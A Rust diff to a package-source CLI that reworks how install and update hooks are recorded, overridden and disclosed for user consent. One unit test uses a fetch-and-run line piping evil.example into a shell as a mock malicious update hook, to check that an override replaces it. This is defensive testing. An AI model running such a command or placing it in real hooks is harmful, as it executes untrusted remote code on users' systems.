@@ -21,7 +21,9 @@ use crate::resolve::{
     is_glob, parse_item_ref, resolve, select, select_by_bare_refs, select_installed,
     source_matches, source_matches_glob,
 };
-use crate::source::{ManifestOrigin, Pin, Registry, parse_spec, parse_spec_quiet};
+use crate::source::{
+    HookOrigin, ManifestOrigin, Pin, RecordedEvent, Registry, parse_spec, parse_spec_quiet,
+};
 
 /// `mind meld <repo> [--as <prefix>] [--root <dir>] [--follow-branch|--pin-tag|--pin-ref]`
 /// — register and clone a source.
@@ -269,29 +271,92 @@ fn clone_dir_checked(paths: &Paths, source: &crate::source::Source) -> Result<st
     }
 }
 
-/// Whether a recorded install hook has already run at `current` (a real commit).
-fn hook_ran_at(source: &crate::source::Source, command: &str, current: Option<&str>) -> bool {
+/// Whether a recorded hook has already run at `current` (a real commit) FOR
+/// THIS EVENT.
+///
+/// The event is part of the key (HOOK-124): a source that declares the same
+/// command for both `install` and `update` records two independent runs, so
+/// running the install hook must not make the update hook look already-run
+/// (and vice versa).
+// spec: HOOK-124
+fn hook_ran_at(
+    source: &crate::source::Source,
+    command: &str,
+    event: RecordedEvent,
+    current: Option<&str>,
+) -> bool {
     current.is_some()
         && source
             .install_hooks
             .iter()
-            .any(|r| r.command == command && r.ran_at.as_deref() == current)
+            .any(|r| r.is(command, event) && r.ran_at.as_deref() == current)
 }
 
-/// Record (upsert) an install hook's run state on the source.
-fn record_install_hook(source: &mut crate::source::Source, command: &str, ran_at: Option<String>) {
+/// Record (upsert) a hook's run state on the source, keyed by `(command,
+/// event)` (HOOK-124). A run always clears the HOOK-121 baseline flag: the
+/// record now describes an actual run.
+fn record_install_hook(
+    source: &mut crate::source::Source,
+    command: &str,
+    event: RecordedEvent,
+    ran_at: Option<String>,
+) {
     if let Some(r) = source
         .install_hooks
         .iter_mut()
-        .find(|r| r.command == command)
+        .find(|r| r.is(command, event))
     {
         r.ran_at = ran_at;
+        r.baseline = false;
     } else {
-        source.install_hooks.push(crate::source::RecordedHook {
-            command: command.to_string(),
-            ran_at,
-        });
+        let mut rec = crate::source::RecordedSourceHook::install(command, ran_at);
+        rec.event = Some(event);
+        source.install_hooks.push(rec);
     }
+}
+
+/// Record a hook whose provenance is not the source's own manifest, or that has
+/// not run at all.
+///
+/// Used for the two records `upgrade` cannot reconstruct from the clone: a
+/// consumer `--install-hook` override (HOOK-56) and a curated
+/// `[[discover.sources.hooks]]` entry (DSC-61, HOOK-127), which is why the
+/// label and the `optional` flag are stored alongside the command. Also used
+/// for the HOOK-121 baseline: a declared update hook recorded at the meld
+/// commit WITHOUT running, so it is not pending until the source moves.
+/// Existing records are left alone: a real run must never be overwritten by a
+/// later baseline.
+fn record_source_hook_entry(
+    source: &mut crate::source::Source,
+    hook: &crate::mindfile::ResolvedHook,
+    event: RecordedEvent,
+    ran_at: Option<String>,
+    origin: Option<crate::source::HookOrigin>,
+    baseline: bool,
+) {
+    if let Some(r) = source
+        .install_hooks
+        .iter_mut()
+        .find(|r| r.is(&hook.run, event))
+    {
+        r.origin = origin.or(r.origin);
+        if origin.is_some() {
+            r.name = hook.name.clone();
+            r.optional = hook.optional;
+        }
+        return;
+    }
+    source
+        .install_hooks
+        .push(crate::source::RecordedSourceHook {
+            command: hook.run.clone(),
+            ran_at,
+            event: Some(event),
+            name: origin.is_some().then(|| hook.name.clone()).flatten(),
+            optional: origin.is_some() && hook.optional,
+            origin,
+            baseline,
+        });
 }
 
 /// What the caller should do with the source after a hook batch.
@@ -308,6 +373,12 @@ enum HookOutcome {
 /// hook's non-zero exit propagates as `Err` (HOOK-53), leaving cleanup to the
 /// caller (meld removes the clone; re-meld leaves the source). `install_override`
 /// is the consumer `--install-hook` command (meld only).
+///
+/// Only INSTALL hooks run here (HOOK-121: `meld` is by definition not the state
+/// the update event describes). The declared update hooks are still recorded, at
+/// the meld commit and as baselines that never ran, so the first `upgrade` at an
+/// unmoved source finds nothing pending instead of running a migration against
+/// the very commit that was just installed.
 #[allow(clippy::too_many_arguments)]
 fn run_install_hooks(
     source: &mut crate::source::Source,
@@ -324,10 +395,31 @@ fn run_install_hooks(
         .map(|m| m.resolved_hooks(toml_path))
         .transpose()?
         .unwrap_or_default();
-    // DSC-61: curator-supplied hooks (when applied) run after the source's own,
-    // through the exact same override/disclosure/decide/run path below.
+    // DSC-61, HOOK-127: curator-supplied hooks (when applied) run after the
+    // source's own, through the exact same override/disclosure/decide/run path
+    // below. They are remembered as curated so a later `upgrade` can still
+    // offer them: they live in the PARENT's manifest, so the clone can never be
+    // asked what it declares.
+    let curated_keys: HashSet<(String, &'static str)> = extra_hooks
+        .iter()
+        .map(|h| (h.run.clone(), h.event.as_str()))
+        .collect();
     resolved.extend(extra_hooks);
     let (hooks, replaced) = crate::hook::apply_install_override(resolved, install_override);
+    // An empty or whitespace-only `--install-hook` is absent (HOOK-3), the same
+    // reading `apply_install_override` applies.
+    let override_cmd: Option<&str> = install_override.map(str::trim).filter(|s| !s.is_empty());
+    // HOOK-56, HOOK-127: where each hook came from, when it is not one the
+    // source's own manifest declares. Determines what is stamped on the record.
+    let origin_of = |h: &crate::mindfile::ResolvedHook| -> Option<HookOrigin> {
+        if h.event == HookEvent::Install && override_cmd == Some(h.run.as_str()) {
+            Some(HookOrigin::Override)
+        } else if curated_keys.contains(&(h.run.clone(), h.event.as_str())) {
+            Some(HookOrigin::Curated)
+        } else {
+            None
+        }
+    };
 
     let pin_desc = pin_description(&source.pin);
     let commit = source.commit.clone().unwrap_or_default();
@@ -338,13 +430,13 @@ fn run_install_hooks(
     for h in hooks.iter().filter(|h| h.event == HookEvent::Install) {
         // HOOK-60: by default re-offer only hooks not yet run at this commit;
         // `--force` (force_rerun) re-offers every install hook.
-        if !force_rerun && hook_ran_at(source, &h.run, current.as_deref()) {
+        if !force_rerun && hook_ran_at(source, &h.run, RecordedEvent::Install, current.as_deref()) {
             continue;
         }
 
         // HOOK-56: show the loud override note on the hook the override produced.
         let declared_override: Option<String> = replaced.as_ref().and_then(|cmds| {
-            if install_override.map(str::trim) == Some(h.run.as_str()) {
+            if override_cmd == Some(h.run.as_str()) {
                 Some(cmds.join("; "))
             } else {
                 None
@@ -375,7 +467,8 @@ fn run_install_hooks(
                 println!("running install hook '{}' for {}", h.label(), name);
                 // HOOK-53: a non-zero exit (optional or required) is a hard stop.
                 crate::hook::run_hook(&h.run, clone_dir, &name, "install", h.label())?;
-                record_install_hook(source, &h.run, current.clone());
+                record_install_hook(source, &h.run, RecordedEvent::Install, current.clone());
+                stamp_origin(source, h, RecordedEvent::Install, origin_of(h));
             }
             crate::hook::HookAct::Skip => {
                 // spec: CLI-217 -- `meld --json` reaches this (the no-TTY skip
@@ -385,12 +478,46 @@ fn run_install_hooks(
                     h.label(),
                     name
                 ));
-                record_install_hook(source, &h.run, None);
+                record_install_hook(source, &h.run, RecordedEvent::Install, None);
+                stamp_origin(source, h, RecordedEvent::Install, origin_of(h));
             }
             crate::hook::HookAct::Abort => return Ok(HookOutcome::Abort),
         }
     }
+
+    // spec: HOOK-121 -- record every declared update hook at the meld commit,
+    // as a baseline that never ran. Without this the hook has no record at all,
+    // "absent" reads as pending, and the very next `upgrade` runs an update
+    // migration against the commit `meld` just installed -- on a source that
+    // has not moved. An existing record (a real run, or a re-meld's baseline)
+    // is left alone.
+    for h in hooks.iter().filter(|h| h.event == HookEvent::Update) {
+        record_source_hook_entry(
+            source,
+            h,
+            RecordedEvent::Update,
+            current.clone(),
+            origin_of(h),
+            true,
+        );
+    }
+
     Ok(HookOutcome::Proceed)
+}
+
+/// Stamp a record's provenance after [`record_install_hook`] created it, for a
+/// hook that did not come from the source's own manifest (HOOK-56, HOOK-127).
+/// A no-op for an ordinary declared hook.
+fn stamp_origin(
+    source: &mut crate::source::Source,
+    hook: &crate::mindfile::ResolvedHook,
+    event: RecordedEvent,
+    origin: Option<HookOrigin>,
+) {
+    if origin.is_none() {
+        return;
+    }
+    record_source_hook_entry(source, hook, event, None, origin, false);
 }
 
 /// Curator-supplied configuration for a nested source, lifted from a parent
@@ -3546,9 +3673,12 @@ fn learn_selected(
         }
         let siblings = siblings_of(&items, &target.source);
         let force = clobber == Clobber::Force;
-        // spec: HOOK-125 -- a `learn` over an item already installed under this
-        // effective name is a re-install, so its update hooks (if any) run in
-        // place of its install hooks.
+        // A `learn` never takes the re-install path: DEP-23 drops every already-
+        // installed key from the closure above, so nothing reaching here is
+        // installed under this effective name (HOOK-125: a repeat `learn` is a
+        // no-op that runs no hook at all). The lookup stays as a defensive
+        // guard, not a behavioral claim -- if the closure ever stopped
+        // excluding installed items, this would still pick the update hooks.
         let is_update = manifest.items.contains_key(target.key().as_str());
         let mut result = install_item(
             paths,
@@ -3721,7 +3851,8 @@ fn learn_collecting_selected(
         }
         let siblings = siblings_of(&items, &target.source);
         let force = clobber == Clobber::Force;
-        // spec: HOOK-125 -- same re-install test as the `learn` path above.
+        // The same defensive guard as the `learn` path above: DEP-23 has
+        // already dropped every installed key, so this is false here.
         let is_update = manifest.items.contains_key(target.key().as_str());
         let result = install_item(
             paths,
@@ -5119,9 +5250,13 @@ fn item_catalog_match<'a>(
 /// Derive the convention path for a `(kind, name)` pair within a source root,
 /// relative to that root. Used by `absorb` to know where to move an item.
 ///
-/// - skill  -> `skills/<name>/`  (returns a directory path)
-/// - agent  -> `agents/<name>.md`
-/// - rule   -> `rules/<name>.md`
+/// - skill   -> `skills/<name>/`  (returns a directory path)
+/// - agent   -> `agents/<name>.md`
+/// - rule    -> `rules/<name>.md`
+/// - command -> `commands/<name>.md` (CMD-8)
+///
+/// A tool is never unmanaged (it is store-only, so it is never linked into a
+/// lobe for `absorb` to find), and panics.
 fn convention_path_in_root(
     root: &std::path::Path,
     kind: ItemKind,
@@ -6973,9 +7108,11 @@ fn upgrade_inner_scoped(
             .map(|first| candidates.fold(first, |acc, c| acc.intersection(&c).cloned().collect()))
     };
 
-    // HOOK-11: re-run a source's install hook when its commit has advanced past
-    // the commit the hook last ran at (or it was recorded but never run). This is
-    // a source-level pass, separate from the per-item upgrade loop below.
+    // HOOK-11, HOOK-121, HOOK-122: run each source's pending source-level hooks
+    // for this update -- its update hooks when it declares any, else its
+    // recorded install hooks -- when the commit has advanced past the commit the
+    // hook last ran at (or it was recorded but never run). This is a
+    // source-level pass, separate from the per-item upgrade loop below.
     rerun_source_hooks(
         paths,
         &mut registry,
@@ -7418,6 +7555,7 @@ fn rerun_source_hooks(
         }
 
         let event = pending.event;
+        let recorded_event = pending.recorded_event;
         let pin_desc = pin_description(&source.pin);
         let commit = source.commit.clone().unwrap_or_default();
         let clone_path = dir.display().to_string();
@@ -7453,13 +7591,15 @@ fn rerun_source_hooks(
                     &commit,
                     &clone_path,
                     &hook.run,
-                    None,
+                    hook.declared_override.as_deref(),
                     browse_url.as_deref(),
                 );
-                // Abort is treated as Skip here (the source is already registered,
-                // per the HOOK-11 note), so an optional and a required hook get
-                // the same two outcomes; only the prompt's shape differs
-                // (HOOK-52).
+                // Abort is treated as Skip here (the source is already
+                // registered, per the HOOK-11 note), so both prompts have the
+                // same two outcomes; the optional/required distinction still
+                // decides the prompt's shape and how the hook is disclosed
+                // (HOOK-52), which is why `optional` is carried from the
+                // declaration rather than assumed.
                 if hook.optional {
                     matches!(
                         crate::hook::prompt_choice_optional(&disclosure)?,
@@ -7490,10 +7630,11 @@ fn rerun_source_hooks(
                     return Err(e);
                 }
                 // HOOK-55, HOOK-124: record the commit the hook ran at. An
-                // update hook shares the install hooks' recorded set, keyed by
-                // command, so this upserts for either event.
+                // update hook shares the install hooks' recorded set, but not
+                // their key: the record is keyed by (command, event), so a run
+                // of one event never settles the other.
                 let ran_at = source.commit.clone();
-                record_install_hook(source, &hook.run, ran_at);
+                record_install_hook(source, &hook.run, recorded_event, ran_at);
                 changed = true;
                 if !json_mode() {
                     println!("ran {event} hook for {}", source.name);
@@ -7513,69 +7654,154 @@ struct UpgradeHook {
     run: String,
     label: String,
     optional: bool,
+    /// The declared command(s) a consumer `--install-hook` override replaced,
+    /// for the loud override note in the disclosure (HOOK-56). `None` when this
+    /// is not an overriding hook.
+    declared_override: Option<String>,
 }
 
 /// The hooks `upgrade` should offer for one source, and the event they belong
 /// to (HOOK-121, HOOK-122).
 struct PendingUpgradeHooks {
+    /// The event's name, for the disclosure and the notes.
     event: &'static str,
+    /// The same event, for the run record's key (HOOK-124).
+    recorded_event: RecordedEvent,
     hooks: Vec<UpgradeHook>,
 }
 
 /// Select the hooks an `upgrade` offers for `source`, whose clone is at
-/// `clone_dir` (HOOK-122).
+/// `clone_dir` (HOOK-122). I/O wrapper around [`select_upgrade_hooks`]: reads
+/// the clone's `mind.toml` and hands the selector what it declares.
 ///
-/// A source that declares any update hook offers its pending update hooks and
-/// none of its install hooks; one that declares none re-offers its pending
-/// recorded install hooks (HOOK-11/55), which is the unchanged behavior for
-/// every source that has not opted in.
-///
-/// The update hooks come from the clone's `mind.toml`, not from the recorded
-/// set: the record is keyed by command alone and does not say which event a
-/// command belongs to, and a newly declared update hook has no record yet. A
-/// clone that cannot be read or whose manifest does not parse contributes no
-/// update hooks, leaving the install-hook path: `upgrade` reports a broken
-/// source through the scan below, and must not turn a malformed manifest into a
-/// silent change of which arbitrary code runs.
+/// A clone that cannot be read, or whose manifest does not parse, declares
+/// nothing. That is deliberately fail-closed on BOTH branches: no update hook
+/// is offered, and no recorded install hook is replayed either, since a record
+/// alone cannot show that the source still stands behind the command (HOOK-55).
+/// `upgrade` reports the broken source through the scan below.
 // spec: HOOK-121 HOOK-122 HOOK-124
 fn pending_update_hooks(
     source: &crate::source::Source,
     clone_dir: &std::path::Path,
 ) -> PendingUpgradeHooks {
+    let loaded = MindToml::load(clone_dir).ok().flatten();
+    let has_manifest = loaded.is_some();
+    let declared = loaded
+        .map(|mf| {
+            mf.resolved_hooks(&clone_dir.join("mind.toml"))
+                .unwrap_or_default()
+        })
+        .unwrap_or_default();
+    select_upgrade_hooks(source, &declared, has_manifest)
+}
+
+/// The pure hook selection behind [`pending_update_hooks`] (HOOK-122).
+///
+/// A source that has any update hook in effect offers its pending update hooks
+/// and none of its install hooks; one that has none re-offers its pending
+/// recorded install hooks (HOOK-11/55), the unchanged behavior for every source
+/// that has not opted in.
+///
+/// "In effect" is the clone's declared update hooks (`declared`) plus the
+/// curated `[[discover.sources.hooks]]` update entries recorded on the source
+/// (HOOK-127) -- those live in the parent super-source's manifest, so the clone
+/// can never be asked about them -- and, when the consumer melded with
+/// `--install-hook`, that override replaces the lot (HOOK-56: the override
+/// covers the install AND the update event, so a source cannot escape it by
+/// moving the command to `event = "update"`).
+///
+/// `has_manifest` is the DSC-60 gate: once the source ships a `mind.toml` of its
+/// own, curated values stop applying to it.
+// spec: HOOK-56 HOOK-121 HOOK-122 HOOK-124 HOOK-127
+fn select_upgrade_hooks(
+    source: &crate::source::Source,
+    declared: &[crate::mindfile::ResolvedHook],
+    has_manifest: bool,
+) -> PendingUpgradeHooks {
     let current = source.commit.as_deref();
-    let declared = match MindToml::load(clone_dir) {
-        Ok(Some(mf)) => mf
-            .resolved_hooks(&clone_dir.join("mind.toml"))
-            .unwrap_or_default(),
-        _ => Vec::new(),
-    };
-    let updates: Vec<&crate::mindfile::ResolvedHook> = declared
+    let keep_curated = !has_manifest;
+
+    // The update hooks in effect: declared first, then curated (the meld order).
+    let mut updates: Vec<UpgradeHook> = declared
         .iter()
         .filter(|h| h.event == HookEvent::Update)
+        .map(|h| UpgradeHook {
+            run: h.run.clone(),
+            label: h.label().to_string(),
+            optional: h.optional,
+            declared_override: None,
+        })
         .collect();
+    if keep_curated {
+        updates.extend(
+            source
+                .install_hooks
+                .iter()
+                .filter(|r| r.origin == Some(HookOrigin::Curated))
+                .filter(|r| r.event() == RecordedEvent::Update)
+                .map(|r| UpgradeHook {
+                    run: r.command.clone(),
+                    label: r.label().to_string(),
+                    optional: r.optional,
+                    declared_override: None,
+                }),
+        );
+    }
+
     if !updates.is_empty() {
+        // HOOK-56: the consumer's command replaces every update hook, and says
+        // so loudly, exactly as it does at meld for the install event.
+        if let Some(cmd) = source.override_command() {
+            let replaced: Vec<String> = updates.iter().map(|h| h.run.clone()).collect();
+            updates = vec![UpgradeHook {
+                run: cmd.to_string(),
+                label: cmd.to_string(),
+                optional: false,
+                declared_override: Some(replaced.join("; ")),
+            }];
+        }
+        updates.retain(|h| !hook_ran_at(source, &h.run, RecordedEvent::Update, current));
         return PendingUpgradeHooks {
-            event: "update",
-            hooks: updates
-                .into_iter()
-                .filter(|h| !hook_ran_at(source, &h.run, current))
-                .map(|h| UpgradeHook {
-                    run: h.run.clone(),
-                    label: h.label().to_string(),
-                    optional: h.optional,
-                })
-                .collect(),
+            event: RecordedEvent::Update.as_str(),
+            recorded_event: RecordedEvent::Update,
+            hooks: updates,
         };
     }
+
+    // No update hooks: re-offer the pending recorded install hooks, recovering
+    // each one's label and `optional` flag from what the source declares now.
+    // The record carries neither (a name is not part of a command's identity),
+    // so building the disclosure from the record alone would rename the
+    // author's hook to its raw command and call an optional hook required.
+    let declared_install: Vec<String> = declared
+        .iter()
+        .filter(|h| h.event == HookEvent::Install)
+        .map(|h| h.run.clone())
+        .collect();
     PendingUpgradeHooks {
-        event: "install",
+        event: RecordedEvent::Install.as_str(),
+        recorded_event: RecordedEvent::Install,
         hooks: source
-            .pending_install_hooks(current)
+            .pending_install_hooks(current, &declared_install, keep_curated)
             .into_iter()
-            .map(|h| UpgradeHook {
-                run: h.command.clone(),
-                label: h.command.clone(),
-                optional: false,
+            .map(|r| {
+                let decl = declared
+                    .iter()
+                    .find(|h| h.event == HookEvent::Install && h.run == r.command);
+                // HOOK-56: an overriding command keeps its loud note here too,
+                // naming what the source declares in its place.
+                let declared_override = (r.origin == Some(HookOrigin::Override)
+                    && !declared_install.is_empty())
+                .then(|| declared_install.join("; "));
+                UpgradeHook {
+                    run: r.command.clone(),
+                    label: decl
+                        .map(|d| d.label())
+                        .unwrap_or_else(|| r.label())
+                        .to_string(),
+                    optional: decl.map(|d| d.optional).unwrap_or(r.optional),
+                    declared_override,
+                }
             })
             .collect(),
     }
@@ -11210,12 +11436,28 @@ mod tests {
         let _ = std::fs::remove_dir_all(&base);
     }
 
-    /// Whether `upgrade` would offer any hook for this source, with no clone on
-    /// disk (so no `mind.toml`, so no update hooks: the install-hook path,
-    /// HOOK-122). The `pending_update_hooks` selector replaced the old
-    /// `hook_rerun_warranted` predicate; this keeps the truth table it covered.
+    /// A declared install hook, for the selector tests.
+    fn declared_install(run: &str) -> crate::mindfile::ResolvedHook {
+        crate::mindfile::ResolvedHook {
+            run: run.to_string(),
+            name: None,
+            optional: false,
+            event: HookEvent::Install,
+        }
+    }
+
+    /// Whether `upgrade` would offer any hook for this source, when the source
+    /// still declares every recorded command as an install hook and declares no
+    /// update hook (the install-hook path, HOOK-122). The `pending_update_hooks`
+    /// selector replaced the old `hook_rerun_warranted` predicate; this keeps
+    /// the truth table it covered.
     fn hook_rerun_warranted(source: &crate::source::Source) -> bool {
-        !pending_update_hooks(source, std::path::Path::new("/nonexistent-mind-clone"))
+        let declared: Vec<crate::mindfile::ResolvedHook> = source
+            .install_hooks
+            .iter()
+            .map(|r| declared_install(&r.command))
+            .collect();
+        !select_upgrade_hooks(source, &declared, true)
             .hooks
             .is_empty()
     }
@@ -11227,17 +11469,119 @@ mod tests {
     /// `hooks` is a list of `(command, ran_at)` pairs to populate
     /// `Source.install_hooks`.
     fn hook_source(commit: Option<&str>, hooks: &[(&str, Option<&str>)]) -> crate::source::Source {
-        use crate::source::RecordedHook;
+        use crate::source::RecordedSourceHook;
         let mut s = crate::source::parse_spec("acme/tools").expect("spec parses");
         s.commit = commit.map(str::to_string);
         s.install_hooks = hooks
             .iter()
-            .map(|(cmd, ran_at)| RecordedHook {
-                command: cmd.to_string(),
-                ran_at: ran_at.map(str::to_string),
-            })
+            .map(|(cmd, ran_at)| RecordedSourceHook::install(*cmd, ran_at.map(str::to_string)))
             .collect();
         s
+    }
+
+    /// A recorded install hook the source's clone no longer declares must not be
+    /// re-offered: the disclosure would say `Event: install` for a command no
+    /// site declares, and a `--dangerously-skip-install-hook-check` run would
+    /// execute it unattended at a commit the author controls.
+    // spec: HOOK-55
+    #[test]
+    fn a_withdrawn_install_hook_is_not_replayed_from_the_record() {
+        let source = hook_source(Some("new0000"), &[("make install", Some("old0000"))]);
+        assert!(
+            select_upgrade_hooks(&source, &[], true).hooks.is_empty(),
+            "a record with no matching declaration is not offered"
+        );
+        assert!(
+            !select_upgrade_hooks(&source, &[declared_install("make install")], true)
+                .hooks
+                .is_empty(),
+            "the same record IS offered while the source still declares it"
+        );
+    }
+
+    /// The install-hook fallback takes the author's `name` and `optional` flag
+    /// from the declaration, not from the record (which carries neither for a
+    /// declared hook). Disclosing an optional hook as required, under its raw
+    /// command instead of its name, misstates the two things the consent prompt
+    /// is for.
+    // spec: HOOK-51 HOOK-52
+    #[test]
+    fn a_pending_install_hook_is_disclosed_with_its_declared_name_and_optional_flag() {
+        let source = hook_source(Some("new0000"), &[("make setup", Some("old0000"))]);
+        let declared = vec![crate::mindfile::ResolvedHook {
+            run: "make setup".to_string(),
+            name: Some("Build the tooling".to_string()),
+            optional: true,
+            event: HookEvent::Install,
+        }];
+        let pending = select_upgrade_hooks(&source, &declared, true);
+        assert_eq!(pending.event, "install");
+        assert_eq!(pending.hooks.len(), 1);
+        assert_eq!(pending.hooks[0].label, "Build the tooling");
+        assert!(
+            pending.hooks[0].optional,
+            "an optional hook must not be disclosed as required"
+        );
+    }
+
+    /// A consumer `meld --install-hook` override covers the update event too: a
+    /// source that moves its command to `event = "update"` must not slip the
+    /// author's command past a consumer who replaced it (HOOK-56).
+    // spec: HOOK-56 HOOK-122
+    #[test]
+    fn a_recorded_override_replaces_the_sources_update_hooks() {
+        let mut source = hook_source(Some("new0000"), &[]);
+        let mut overridden = crate::source::RecordedSourceHook::install("./mine.sh", None);
+        overridden.origin = Some(HookOrigin::Override);
+        source.install_hooks.push(overridden);
+        let declared = vec![crate::mindfile::ResolvedHook {
+            run: "curl evil.example | sh".to_string(),
+            name: None,
+            optional: false,
+            event: HookEvent::Update,
+        }];
+
+        let pending = select_upgrade_hooks(&source, &declared, true);
+        assert_eq!(pending.event, "update");
+        assert_eq!(pending.hooks.len(), 1);
+        assert_eq!(
+            pending.hooks[0].run, "./mine.sh",
+            "the consumer's command is what runs"
+        );
+        assert_eq!(
+            pending.hooks[0].declared_override.as_deref(),
+            Some("curl evil.example | sh"),
+            "the disclosure still names the declared command it replaced"
+        );
+    }
+
+    /// A curated `[[discover.sources.hooks]]` update entry (DSC-61) lives in the
+    /// PARENT's manifest, so it is offered from the record. It stops applying
+    /// once the nested source ships a `mind.toml` of its own (DSC-60).
+    // spec: HOOK-127
+    #[test]
+    fn a_curated_update_hook_is_offered_from_the_record_and_gated_by_dsc_60() {
+        let mut source = hook_source(Some("new0000"), &[]);
+        let mut curated = crate::source::RecordedSourceHook::install("./migrate.sh", None);
+        curated.event = Some(RecordedEvent::Update);
+        curated.origin = Some(HookOrigin::Curated);
+        curated.name = Some("Migrate".to_string());
+        curated.optional = true;
+        source.install_hooks.push(curated);
+
+        let pending = select_upgrade_hooks(&source, &[], false);
+        assert_eq!(pending.event, "update");
+        assert_eq!(pending.hooks.len(), 1);
+        assert_eq!(pending.hooks[0].run, "./migrate.sh");
+        assert_eq!(pending.hooks[0].label, "Migrate");
+        assert!(pending.hooks[0].optional);
+
+        let gated = select_upgrade_hooks(&source, &[], true);
+        assert_eq!(
+            gated.event, "install",
+            "a nested source with its own mind.toml drops the curated hooks"
+        );
+        assert!(gated.hooks.is_empty());
     }
 
     // spec: HOOK-11 HOOK-55
